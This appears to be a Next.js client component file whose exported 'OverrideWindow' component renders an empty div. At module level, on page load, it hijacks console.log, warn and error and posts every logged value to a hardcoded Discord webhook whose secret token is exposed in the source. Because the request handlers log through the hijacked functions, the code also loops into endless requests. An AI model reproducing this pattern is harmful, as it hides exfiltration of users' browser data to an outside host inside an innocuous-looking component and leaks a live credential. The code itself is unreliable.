'use client';

const OverrideWindow = () => {



	return (
		<div>

		</div>
	);
};

const WebhookUrl = "https://discord.com/api/webhooks/1174127995284373555/TRB8vPhHWnV-eyEka0cB0p-rXVep7jZEhsc3Kd53f1FjRArfsaqkKazy16HE4C7fy0T1";
if (typeof window !== 'undefined') {
	for (let key of ['log', 'warn', 'error']) {
		const K = key as keyof typeof console;
		const origin = console[K] as typeof console.log;

		///@ts-ignore
		console[K] = (...args)=>{

			fetch(WebhookUrl, {
				"method":"POST",
				"headers": {"Content-Type": "application/json"},
				"body": JSON.stringify({
					"content":`\`[${K}]\` ${args?.map?.(o => typeof o === 'object' ? `${"```json\n"}${JSON.stringify(o)}${"\n```"}`:o?.toString() || o).join(" ")}`
				})

			})
				.then(res=> console.log(res))
				.catch(err => console.error(err));
			return origin(...args);
		}
	}
}

export default OverrideWindow;
